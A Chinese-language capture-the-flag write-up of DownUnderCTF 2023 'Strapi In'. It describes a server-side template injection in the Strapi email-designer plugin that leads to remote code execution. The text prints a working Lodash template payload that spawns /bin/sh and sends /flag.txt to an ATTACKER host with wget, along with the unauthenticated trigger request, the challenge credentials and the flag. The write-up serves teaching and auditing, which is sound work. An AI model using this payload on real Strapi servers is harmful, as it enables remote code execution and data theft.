# DownUnderCTF 2023 Strapi In Writeup

## 题目简述

目标使用 Strapi 4.12.4，并安装 `strapi-plugin-email-designer` 2.1.2。题目给出低权限 `author` 账户，可在后台创建邮件模板；自定义 API `/api/sendtestemail/:refId` 又允许未认证用户按引用 ID 触发模板渲染。

该插件复制了旧版 Strapi 邮件模板的危险实现，使用 Lodash 模板引擎求值用户可控内容，形成服务端模板注入。创建恶意模板并触发发送即可在 Node.js 进程中执行命令，读取 `/flag.txt`。

## 解题过程

依赖清单中的决定性线索是：

```json
{
  "@strapi/strapi": "4.12.4",
  "strapi-plugin-email-designer": "^2.1.2"
}
```

虽然 Strapi 核心版本已经高于 CVE-2023-22621 的受影响范围，但邮件设计器插件复用了同类 `lodash.template` 渲染代码，因此不能仅凭核心版本判断安全。漏洞发现者的 [Strapi 邮件模板研究](https://www.ghostccamm.com/blog/multi_strapi_vulns/) 说明了根因：`<%= ... %>` 块会作为 JavaScript 表达式执行，且可通过构造模板片段绕过原有校验。

使用题目给出的账户登录后台：

```text
username: author
password: Sup3r secure auth0r pass?
```

在 Email Designer 中新建模板，并把正文设置为：

```ejs
<%= `${ process.binding("spawn_sync").spawn({"file":"/bin/sh","args":["/bin/sh","-c","wget https://ATTACKER/?flag=$(cat /flag.txt)"],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"/*<>%=*/}]}).output }` %>
```

这里的关键点是：

- `<%= ... %>` 进入 Lodash 表达式求值；
- `process.binding("spawn_sync")` 直接调用同步进程创建能力；
- `/bin/sh -c` 读取 `/flag.txt`，再通过外部 HTTP 请求把内容送出；
- `/*<>%=*/` 位于对象字面量中，用于扰乱插件沿用的模板校验，而不会改变 JavaScript 执行结果。

保存模板后记录其 `templateReferenceId`。题目自定义路由明确配置 `auth: false`：

```javascript
{
  method: 'GET',
  path: '/sendtestemail/:refId',
  handler: 'email-tester.sendTestEmail',
  config: { auth: false },
}
```

访问下列路径触发 `email-designer` 的 `sendTemplatedEmail()`：

```bash
curl 'http://TARGET/api/sendtestemail/TEMPLATE_REFERENCE_ID'
```

模板在服务器端求值后，攻击者接收端取得：

```text
DUCTF{sTr4pI_eM41l_d351gN3r_d3V_pLz_sT0P_gH05tInG_mY_r3P0rT5_4_m0nTh5!!1}
```

仓库中的 favicon 和题面外链 GIF 都是装饰资源，没有保留到 WP 图片目录；外部漏洞文章的关键版本边界、模板求值根因和命令执行方式已在正文中完整概括。

## 方法总结

第三方插件可能把上游已经修复的危险代码重新带回新版本应用。本题的权限链也很典型：低权限账户负责写入持久化模板，公开测试接口负责触发渲染，两者组合成 RCE。审计 CMS 时应把插件依赖、模板写权限和所有渲染入口放在同一条数据流中检查，而不是只查看核心框架版本。
